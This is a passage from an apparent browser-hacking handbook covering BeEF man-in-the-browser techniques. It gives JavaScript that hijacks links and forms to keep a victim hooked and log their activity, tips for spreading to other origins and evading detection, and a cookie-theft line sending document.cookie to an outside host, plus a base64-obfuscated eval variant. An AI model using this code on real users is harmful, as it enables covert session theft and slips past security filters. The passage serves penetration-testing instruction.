
``` 
// Fetches a hooked link with AJAX
    fetch:function (url, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);
            return true;
        } catch (x) {
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
            return false;
        }
    },

// Hooks anchors and prevents them from linking away
    poisonAnchor:function (e) {
        try {
            e.preventDefault;
            if (beef.mitb.fetch(e.currentTarget, 
              document.getElementsByTagName("html")[0])) {
               var title = "";
               if(document.getElementsByTagName("title").length == 0){
                title = document.title;
               }else{
                title = document.getElementsByTagName(
                 "title")[0].innerHTML;
               }
                history.pushState({ Be:"EF" }, title, e.currentTarget);
            }
        } catch (e) {
          console.error('beef.mitb.poisonAnchor - failed to execute: '+
            e.message);
        }
        return false;
    },

var anchors = document.getElementsByTagName("a");
var lis = document.getElementsByTagName("li");

        for (var i = 0; i < anchors.length; i++) {
            anchors[i].onclick = beef.mitb.poisonAnchor;
        }
      
        for (var i = 0; i < lis.length; i++) {
            if (lis[i].hasAttribute("onclick")) {
                lis[i].removeAttribute("onclick");
                /*clear*/
                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick(
                 '"+lis[i].getElementsByTagName("a")[0] + "')");
                /*override*/

            }
        }
```

The `fetchOnclick` function is similar to the `fetch` function, and has been omitted. You can find the full source code at [`browserhacker.com`](https://browserhacker.com).

`Poisoning` forms is similar to poisoning links. The only difference is that it requires a bit more logic because the form fields need to be parsed while the `onSubmit` event is triggered. The result is the same, so the POST request is sent using AJAX, and the target `innerHTML` is then updated with the proper content, while in the background the hook is still working. The target is unlikely to spot the attack because there are no changes to the look and feel of the page. The only potential indicator of the attack is opening cross-origin links in new tabs, instead of the current window.

start feature 

* * *

### From Monitoring to Expanding the Attack Surface

It must be noted that user activity, for example which links are clicked and which forms (including data) are submitted, can be logged and made available to you. This is useful in situations where the user is clicking on cross-origin links. In this particular case, thanks to the Same Origin Policy, loading the resource via AJAX obviously won’t be successful. If this happens, the link is simply opened in a new tab, preventing the loss of the hook because the already hooked tab remains open. You can’t control the newly opened tab, because it’s a different origin. However, you can determine what its URL is, because you have full control of the page DOM. At this point you can attempt to expand the attack surface by running `XssRays` on the target resource to look for XSS vulnerabilities. If further flaws are discovered, they can be used to hook the new origin by exploiting the XSS, resulting in the control of the origin loaded in the second tab too. This attack technique with `XssRays` is covered in Chapter 9.

* * *

end feature 

As with all of the techniques available for maintaining a persistent communication channel, there will always be varying degrees of success. One of the potential issues with using MitB logic is handling complex JavaScript-based applications. For instance, when an already existing `onClick` attribute is poisoned through the MitB functionality, some previous code might get overridden, because the legitimate function is simply replaced. A way to overcome this limitation is using `addEventListener`, or `attachEvent` in the case of Internet Explorer, to dynamically call a new function when the same event is triggered16. Using such an approach allows for stacking event handlers, so the new injected ones are called after the existing ones executed. The same problem occurs when appending the response of a poisoned AJAX request to the right page fragment. MitB techniques work well in many situations, but be aware that you may need to customize the default behavior for targeted attacks in complex JavaScript-based web applications.

# Evading Detection

Evading detection from Web Application Firewalls, inspecting web proxies or client-side heuristic Anti-Virus technology is a cat-and-mouse game. Security researchers often find new evasion techniques that work for a period of time. When the techniques become public knowledge, defenders start to implement detection techniques, and the current evasion technique becomes less effective. Translating this into pseudo-code may look like this:

```
loop
 develop_evasion()
 use_it_in_the_wild()
 sleep 10
 defenders_become_aware()
 sleep 20
 defenders_implement_detection()
end
```

Don’t forget that the time it takes for a detection mechanism to be implemented universally may be considerable; the evasion technique will still continue to work in all those environments where the detection is not yet in place. Chaining evasion techniques together can also assist with trying to avoid detection. This will not evade the best human mind if manual analysis is in place, but it will be very effective with proxies and other security devices that inspect the content of HTTP or other protocols.

Imagine a Russian nesting doll (matryoshka), where each layer is a different evasion technique, and the real JavaScript code is then nested inside. Bear in mind that obfuscating JavaScript will not prevent the browser from understanding your code.

Various techniques to help reduce the likelihood that your JavaScript code is detected are presented in the following sections. Each discussed technique has been implemented as an extension within the BeEF framework.

Bear in mind that encoding and obfuscation should not be used to achieve confidentiality of your data. With enough time, every obfuscation technique can be defeated.

## Evasion using Encoding

The first and easiest way to hide the code you want to execute is by encoding it. In this context, encoding and decoding is the process of transforming code from one format into another. Many different encodings and techniques are available within a browser. Some of them are as simple as using base64 to encode a plaintext string. Others are more advanced and rely on particular aspects of the JavaScript language, such as non-alphanumeric codes.

### Base64 Encoding

A common detection technique used to evaluate potentially malicious JavaScript is to implement Regex-based filters that search for `eval`, `document.cookie`, or other keywords that can be potentially used for malicious purposes. If you wanted to steal a web application’s cookies, not marked as HttpOnly, you would execute:

```
location.href='http://browserhacker.com?c='+document.cookie 
```

This code will send the cookies to your site. Unfortunately, the original site’s filter may detect the `document.cookie` reference and filter it out. To hide the `document.cookie` code you can base64-encode it, and the attack vector becomes:

```
eval(atob("bG9jYXRpb24uaHJlZj0naHR0cDovL2F0dGF"+
 "ja2VyLmNvbT9jPScrZG9jdW1lbnQuY29va2ll"));
```
